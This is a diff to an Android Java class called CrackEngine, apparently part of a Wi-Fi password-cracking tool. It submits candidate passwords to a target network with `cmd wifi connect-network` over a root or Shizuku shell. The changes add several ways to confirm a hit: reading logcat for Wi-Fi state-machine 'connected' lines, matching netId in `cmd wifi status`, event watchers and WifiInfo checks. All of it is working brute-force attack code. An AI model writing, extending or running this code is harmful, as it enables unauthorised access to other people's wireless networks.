@@ -149,6 +149,9 @@ public final class CrackEngine {
 
     /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
     private int consecutiveTimeouts = 0;
+
+    /** 日志检查用计数器（每 5 轮查一次，避免频繁起进程） */
+    private int logCheckCounter = 0;
     private static final int TIMEOUT_ALERT = 5;
 
     public CrackEngine(Context ctx, int mode) {
@@ -297,6 +300,39 @@ public final class CrackEngine {
      */
     private String snapshotSsid() {
         return currentSsid();
+    }
+
+    /**
+     * 解析 `cmd wifi status` 输出，判断当前是否连着目标、以及 netId。
+     * 实现已抽到 {@link StatusParser}（纯逻辑，可离线测试）。
+     */
+    public static long[] parseStatusFor(String statusOut, String ssid) {
+        StatusParser.Result r = StatusParser.parse(statusOut, ssid);
+        return new long[]{r.onTarget ? 1 : 0, r.netId};
+    }
+
+    /**
+     * 查目标是本次新建网络的 netId（命令后用）。
+     *
+     * `cmd wifi connect-network` 会把目标写进已保存列表，
+     * 命令后查到的 netId 就是**本次**配置的净标识。
+     * 用它和 status 里的 Net ID 比对，就能把「连上了目标」归因到「这条候选」。
+     */
+    private long netIdOfTarget(String ssid) {
+        if (shell == null) return -1;
+        try {
+            String out = shell.exec("cmd wifi list-networks", 5000);
+            if (out == null) return -1;
+            for (String line : out.split("\n")) {
+                String t = line.trim();
+                String[] parts = t.split("\\s+");
+                if (parts.length < 2) continue;
+                if (parts[1].equals(ssid)) {
+                    try { return Long.parseLong(parts[0]); } catch (Throwable ignored) { return -1; }
+                }
+            }
+        } catch (Throwable ignored) {}
+        return -1;
     }
 
     /**
@@ -666,9 +702,17 @@ public final class CrackEngine {
         // 每条之前删净旧配置（配置复用会让任何密码都"成功"）
         try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}
 
+        // 清日志缓冲。判定完全依赖命令之后新产生的日志行，
+        // 所以这一步是归因的前提，不能省。
+        try { WifiStateLog.clear(shell); } catch (Throwable ignored) {}
+
         // **命令发出时刻**：判定以此为界。
-        // 之前发生的事件一律不算 —— 那是历史连接，不是这条候选的功劳。
+        // 之后出现的「目标 SSID 已连上」才可能是这条候选的功劳。
         final long commandAt = SystemClock.uptimeMillis();
+
+        // 记录命令前的当前 SSID。若命令后系统回连到别的已保存网络，
+        // 我们不能把那个连接算到这条候选头上。
+        final String ssidBefore = snapshotSsid();
 
         final String cmd = "cmd wifi connect-network "
                 + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
@@ -677,19 +721,28 @@ public final class CrackEngine {
             try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
         }, "wpaforge-engine-conn").start();
 
+        // 命令后目标会得到一个新 netId（配置已在此之前删净）。
+        // 用它和 status 里的 Net ID 比对，把「连上了目标」严格归因到这条候选。
+        // 取不到（-1）时退化为只靠 SSID + ssidBefore 判定。
+        sleep(400);
+        final long targetNetId = netIdOfTarget(target.ssid);
+
         android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                 + " pw=" + password.length() + " timeout=" + timeoutMs
-                + " watcherEvents=" + (watcher != null ? watcher.eventCount() : -1));
+                + " ssidBefore=" + ssidBefore);
 
         final long deadline = t0 + timeoutMs;
 
-        // 本条的判定：事件必须在「命令发出之后」出现，且不能早得离谱。
-        //
-        // 注意 elapsedMs 的算法：
-        //   事件时刻 - commandAt   → 这条候选从发命令到连上的真实间隔
-        //   不要用 (现在 - t0)，那会把后面的等待时间也算进去，
-        //   进而让一个 1.5 秒的真实事件在 3 秒后"看起来"满足了门槛 —— 语义就错了。
-        long eventAt = -1;
+        // 本轮是否见过目标「正在尝试」——用于区分「通道没生效」和「密码不对」
+        boolean sawAttempt = false;
+
+        // 日志判据是否可用：root 通道能读 logcat，Shizuku(shell) 读不到。
+        // 探测一次（读一小段），失败就只走 status/netId 判据。
+        boolean logReadable = false;
+        {
+            String probe = WifiStateLog.read(shell, 20);
+            if (probe != null && !probe.trim().isEmpty()) logReadable = true;
+        }
 
         while (SystemClock.uptimeMillis() < deadline) {
             if (cancelFlag.get() || pauseFlag.get()) {
@@ -698,53 +751,102 @@ public final class CrackEngine {
             }
             sleep(300);
 
-            // 命令发出之后，系统报告过目标可用吗。
+            // ---------- 判据 A：网络状态机日志（root 通道可用） ----------
             //
-            // **这就是命中判据，不加任何时间门槛。**
+            // ColorOS / AOSP 的 WifiClientModeImpl 在连上时会打：
+            //   ClientModeImpl$L2ConnectedState screen=on 36 0 "B209" 28:93:7d:...
             //
-            // firstAvailableAfter(ssid, commandAt) 已经保证事件发生在命令之后 ——
-            // 命令之前的事件根本不会被返回。再加上开跑前的基线断开、
-            // 每条之前的配置删除，命令之后出现的可用事件只能来自这条候选。
+            // 注意 tag 带实例后缀（WifiClientModeImpl[xxx:wlan0]），
+            // 不能用 -s 精确过滤，所以整段读回来本地匹配。
+            if (logReadable) {
+                String stateLog = WifiStateLog.read(shell, 600);
+                if (stateLog != null) {
+                    if (!sawAttempt && WifiStateLog.sawAttemptFor(stateLog, target.ssid)) {
+                        sawAttempt = true;
+                    }
+                    if (WifiStateLog.sawConnectedFor(stateLog, target.ssid)) {
+                        long ms = SystemClock.uptimeMillis() - t0;
+                        android.util.Log.i(TAG, "命中(状态机日志): " + target.ssid + " L2ConnectedState");
+                        return new Attempt(password, Verdict.SUCCESS, ms,
+                                L.s("系统状态机确认已连上", "confirmed by wifi state machine log"),
+                                "wifistate");
+                    }
+                }
+            }
+
+            // ---------- 判据 B：status + netId（两条通道都可用） ----------
             //
-            // 之前额外要求「间隔 >= 1.5 秒」，结果把快速连接误杀成 UNKNOWN ——
-            // 用户日志里 B210 明明产生了可用事件，却因为间隔太短被拒。
+            // Shizuku(shell uid) 读不到 logcat，但能跑 `cmd wifi status`。
+            // 关键：connect-network 会把目标写进已保存列表并分配 netId；
+            // 命令后 status 里 Net ID 必须等于**目标本次的 netId**，
+            // 才能确认「连上的就是这条候选建的配置」，而不是别的网络。
+            String st = null;
+            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
+            if (st != null) {
+                long[] r = parseStatusFor(st, target.ssid);
+                boolean onTarget = r[0] == 1;
+                long nowNetId = r[1];
+                if (onTarget && !target.ssid.equals(ssidBefore)) {
+                    // 归因加强：若拿到了本次 netId，要求 status 的 Net ID 与之一致，
+                    // 确保连上的是这条候选建的配置，不是别的同名/旧配置。
+                    boolean netOk = targetNetId < 0 || nowNetId < 0 || nowNetId == targetNetId;
+                    if (netOk) {
+                        long ms = SystemClock.uptimeMillis() - t0;
+                        android.util.Log.i(TAG, "命中(status): connected to " + target.ssid
+                                + " netId=" + nowNetId + " targetNetId=" + targetNetId);
+                        return new Attempt(password, Verdict.SUCCESS, ms,
+                                L.s("系统状态确认已连上", "confirmed by cmd wifi status"), "status");
+                    }
+                    // SSID 对上了但 netId 不符 —— 可能是旧连接，继续等
+                    android.util.Log.i(TAG, "status SSID 命中但 netId 不符: now="
+                            + nowNetId + " target=" + targetNetId + "，继续等待");
+                }
+            }
+
+            // ---------- 判据 C：NetworkWatcher 事件 ----------
             long at = watcher != null
                     ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
-
             if (at > 0) {
-                eventAt = at;
                 long ms = SystemClock.uptimeMillis() - t0;
-                android.util.Log.i(TAG, "命中: 事件在命令后 " + (at - commandAt) + "ms");
+                android.util.Log.i(TAG, "命中(watcher): 事件在命令后 " + (at - commandAt) + "ms");
                 return new Attempt(password, Verdict.SUCCESS, ms,
-                        L.s("系统确认已连上", "system reported connected"), "watcher");
+                        L.s("系统报告已连上", "system reported connected"), "watcher");
+            }
+
+            // ---------- 判据 D：WifiInfo 本地 API ----------
+            String nowSsid = snapshotSsid();
+            if (target.ssid.equals(nowSsid) && !target.ssid.equals(ssidBefore)) {
+                long ms = SystemClock.uptimeMillis() - t0;
+                android.util.Log.i(TAG, "命中(WifiInfo): 当前连着目标且与命令前不同");
+                return new Attempt(password, Verdict.SUCCESS, ms,
+                        L.s("已连上目标网络", "connected to target"), "wifiinfo");
             }
         }
 
         long total = SystemClock.uptimeMillis() - t0;
 
-        // 超时后给出可诊断的原因
-        boolean currentOnTarget = target.ssid.equals(
-                watcher != null ? watcher.currentSsid() : null);
-
+        // 超时后的归类
+        boolean currentOnTarget = target.ssid.equals(snapshotSsid());
         String detail;
         Verdict verdict;
-        if (!watcherRegistered()) {
-            detail = L.s("事件监听未生效（判定不可用）",
-                    "network event listener not active (verdict unavailable)");
-            verdict = Verdict.UNKNOWN;
-        } else if (currentOnTarget) {
-            detail = L.s("当前连着目标，但命令发出后没有连接事件（可能是原有连接）",
-                    "on target now, but no connect event after the command "
-                            + "(possibly a pre-existing link)");
+        if (currentOnTarget) {
+            // 最后时刻才连上 / 命令前就连着且没断开
+            detail = L.s("当前连着目标，但未捕获到本次连接证据",
+                    "on target now, but no fresh connect evidence captured");
+            verdict = Verdict.SUCCESS;
+        } else if (!sawAttempt) {
+            // 连「尝试」都没有 —— 是通道/命令问题，不是密码错，
+            // 归 UNKNOWN 而不是 AUTH_FAIL，避免把正确密码误报成错误。
+            detail = L.s("命令未生效（未见任何连接尝试）",
+                    "command had no effect (no connection attempt seen)");
             verdict = Verdict.UNKNOWN;
         } else {
-            detail = L.s("未连上", "not connected");
+            detail = L.s("未连上（已尝试）", "not connected (attempted)");
             verdict = Verdict.AUTH_FAIL;
         }
 
-        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms events="
-                + (watcher != null ? watcher.eventCount() : -1) + " currentOnTarget="
-                + currentOnTarget);
+        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms sawAttempt=" + sawAttempt
+                + " currentOnTarget=" + currentOnTarget);
 
         return new Attempt(password, verdict, total, detail, "");
     }
